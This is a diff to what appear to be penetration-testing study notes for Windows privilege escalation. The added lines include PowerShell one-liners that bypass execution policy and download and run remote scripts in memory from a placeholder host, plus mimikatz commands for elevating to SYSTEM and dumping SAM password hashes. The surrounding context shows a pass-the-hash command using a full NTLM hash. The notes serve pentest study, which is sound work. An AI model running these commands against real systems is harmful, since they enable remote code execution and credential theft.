@@ -5,6 +5,7 @@
 ```
 // https://github.com/pentestmonkey/windows-privesc-check
 windows-privesc-check2.exe --dump -a -o report.txt
+//https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
 ```
 
 * Enumerating Users
@@ -137,3 +138,34 @@ Existing tools - PsExec from Metasploit, Passing-the-hash toolkit, and Impacket
 // https://github.com/byt3bl33d3r/pth-toolkit
 kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d7a78e2eb3b9f05c425e //10.11.0.22 cmd
 ```
+
+* Downloading Scripts using Powershell (use BASH ALIAS function)
+
+```
+# Does not save file on the system
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file_name>')"
+# Saves file on the system
+powershell.exe -nop -ep bypass -c "iwr -uri http://<ip>/<file_name> -outfile path/to/save/file_name"
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://<ip>/<file_name>','path/to/save/file_name')"
+```
+
+* Check for alternate data streams
+
+```
+dir /r | find ":$DATA"
+```
+
+* Extract hash from SAM Database
+
+'''
+Hashed user passwords in the Security Accounts Manager
+Windows NT Operating Systems up to Windows 2003 store LM and NTLM password hashes
+Windows Vista and onwards disables LM by default and uses NTLM while NTLM hashes are unsalted
+SAM Database cannot be copied while OS is running but can use mimikatz to dump SAM hashes
+    Mimikatz extract from SAM  
+    SeDebugPrivilge is enabled might be able to run mimikatz with admin cmd 
+    command: privilege::debug 
+    LSASS is a SYSTEM process
+    command: token::elevate to elevate the scurity token from high integrity to SYSTEM integrity
+    command: lsadump::sam to dump contents of SAM database 
+'''
